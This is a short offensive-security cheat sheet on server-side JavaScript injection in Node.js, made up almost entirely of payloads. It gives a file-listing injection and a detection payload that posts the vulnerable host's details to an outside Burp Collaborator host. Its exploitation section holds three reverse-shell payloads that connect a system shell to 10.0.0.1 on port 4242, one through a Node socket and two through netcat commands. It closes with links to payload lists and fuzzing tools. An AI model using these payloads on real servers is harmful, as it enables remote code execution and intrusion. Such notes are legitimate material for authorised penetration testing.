# Server-Side JS Injection

```
- Node Architecture
- NodeJS Built-In Modules: https://www.tutorialsteacher.com/nodejs/nodejs-modules
- File System Access Example
    - res.end(require('fs').readdirSync('.').toString())
    - https://www.secforce.com/blog/server-side-javascript-injection/
```

### Detection

```
;(function(){
    require('https').request({
        hostname: 'burpcollaborator',
        port: 443,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      }, res => {
        res.on('data', d => {
          process.stdout.write(d)
        })
      }).write(new TextEncoder().encode(
        JSON.stringify({
          vulnerableHost: req.hostname,
          vulnerableURL: req.originalUrl
        })
      ))
})();
```

### exploitation

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

### Reverse Shell

```
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
```

### Automation

```
    - Inputs
        - GET Parameters -> paramspider + ffuf
        - POST -> logger++ + intuder
        - Headers -> AutoRepeater
        - https://github.com/devanshbatham/ParamSpider
        - https://github.com/ffuf/ffuf
        - https://github.com/epi052/feroxbuster
    - Nodexp
        - https://github.com/esmog/nodexp
        - settings -> FUZZ
```

